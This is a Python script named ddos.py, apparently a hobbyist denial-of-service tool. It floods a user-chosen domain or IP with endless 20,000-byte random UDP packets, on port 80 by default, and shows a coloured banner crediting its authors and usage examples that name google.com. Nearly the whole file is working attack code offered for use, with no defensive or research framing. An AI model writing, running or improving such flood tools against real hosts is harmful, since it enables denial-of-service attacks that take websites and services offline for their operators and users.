#!/usr/bin/python3
# Coder By ALi2004h {*Ali HemmatNia*}
# Github : github.com/ali2004-linux
# Version Python All Versions
#Modifie By A1Python

import socket
import os
from sys import argv
from colorama import Fore,Style
from platform import system

if system() == "Linux":
    os.system ("clear && clear")
else: 
    os.system ("cls && cls")
overflowerror = 0
oserror = 0
def banner():
    
    b = f"""{Fore.YELLOW}
        \t\t    _    _ _ ____   ___   ___  _  _   _     
        \t\t   / \  | (_)___ \ / _ \ / _ \| || | | |__  
        \t\t  / _ \ | | | __) | | | | | | | || |_| '_ \ 
        \t\t / ___ \| | |/ __/| |_| | |_| |__   _| | | |
        \t\t/_/   \_\_|_|_____|\___/ \___/   |_| |_| |_|                                    
    {Style.RESET_ALL}"""
    print(b)
    print(f"{Fore.BLUE}\n\t\t\t Github : https://Github.com/Ali2004-linux\n\t\t\t    {Fore.MAGENTA}Github : https://Github.com/A1Python\n\t\t\t{Style.RESET_ALL}      {Fore.BLUE}Gmail : ALi2004h.linux@gmail.com{Style.RESET_ALL}")
    print(Fore.RED+"\n\t\t   Usage : python3 ddos.py <Domain Name> or Enter <Site IP>")
    print(Fore.GREEN+"\n\t       Exmple : python3 ddos.py google.com or python3 ddos.py 127.0.0.1")
    print(Fore.MAGENTA+"\n\t\t\t\t<<<<Default Port Is 80>>>>"+Fore.WHITE)
    print(Fore.GREEN+"\n\t\t    Ali2004h {Ali HemmatNia} ---- Modified by A1Python"+Fore.WHITE)
    
def main():
    os.system('clear && clear')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #tcp connect
    try:
        ip = argv[1]
        f = 0
        t = os.urandom(20000)
        port = 0
        banner()
        global overflowerror
        global oserror
        if overflowerror == 1:
            print(f"\n>>>> {Fore.MAGENTA}Previous time,You didn't enter port number between 0-65535{Style.RESET_ALL}")
            overflowerror -= 1
        elif oserror == 1:
            print(f"\n>>>> {Fore.BLUE}You Entered Zero,Enter port number more then 0(Zero){Style.RESET_ALL}")
            oserror -= 1
            
            overflowerror -= 1
        #modified by A1Python
        port_int = input("\nDo you want change port(Y & N): ").lower()
        if port_int == "y":
            while True:
                try:
                    port += int(input("\nType port: "))
                    break
                except ValueError:
                    print(f"\n{Fore.GREEN}Your must be entered number, Sure that it's not empty or string{Style.RESET_ALL}")
        else:
            port += 80
        try:
            while True:
                s.sendto(t, (socket.gethostbyname(ip),port))
                f +=  1
                #Modified by A1Python
                print(f"{Fore.GREEN} [***]{Style.RESET_ALL} {Fore.WHITE} Sending Packet To{Style.RESET_ALL} {Fore.RED}{ip}{Style.RESET_ALL} Port: {Fore.GREEN}{port}{Style.RESET_ALL} Count: {Fore.BLUE}[{f}]!{Style.RESET_ALL}")
        except socket.gaierror:
            print(f"{Fore.GREEN}\n   [***]  {Fore.RED}Entered DOMANIN NAME not found, You have to written like this: {Fore.MAGENTA}google.com\n{Style.RESET_ALL}")
        except OSError:
            oserror += 1
            main()
    except IndexError:
        banner()
        #Modified by A1Python
        print(f"\n{Fore.GREEN}--->{Style.RESET_ALL }{Fore.RED} You didn't type IP address"+Style.RESET_ALL)
    except OverflowError:
        overflowerror += 1
        main()
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("ByBy")
        quit()
        print("ByBy")